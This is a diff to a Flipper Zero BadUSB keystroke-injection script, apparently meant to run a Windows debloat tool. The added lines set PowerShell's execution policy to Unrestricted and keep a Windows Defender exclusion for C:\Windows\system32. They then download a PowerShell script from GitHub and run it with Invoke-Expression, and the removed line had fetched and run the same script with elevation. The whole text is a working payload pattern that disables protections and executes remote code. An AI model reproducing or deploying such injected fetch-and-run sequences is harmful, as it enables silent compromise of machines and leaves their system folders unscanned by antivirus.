@@ -12,8 +12,24 @@ SHIFT TAB
 DELAY 500
 ENTER
 DELAY 1500
+STRING mkdir C:\ProgramData\Debloat
+ENTER
+DELAY 250
+STRING cd C:\ProgramData\Debloat
+ENTER
+DELAY 250
+STRING Set-ExecutionPolicy Unrestricted
+ENTER
+DELAY 250
+STRING A
+ENTER
+DELAY 500
 STRING Add-MpPreference -ExclusionPath C:\Windows\system32
 ENTER
 DELAY 750
-STRING New-Object System.Net.WebClient | Foreach-Object {$_.DownloadFile('https://github.com/MFisher14/FlipperZero/blob/main/BadUSB/RemoveBloat.ps1', 'script.ps1'); Start-Process powershell.exe -Verb runAs -ArgumentList "-File script.ps1"}, exit
+STRING $ScriptFromGitHub = Invoke-WebRequest https://raw.githubusercontent.com/MFisher14/FlipperZero/main/BadUSB/RemoveBloat.ps1
 ENTER
+DELAY 5000
+STRING Invoke-Expression $($ScriptFromGitHub.Content)
+ENTER
+DELAY 500
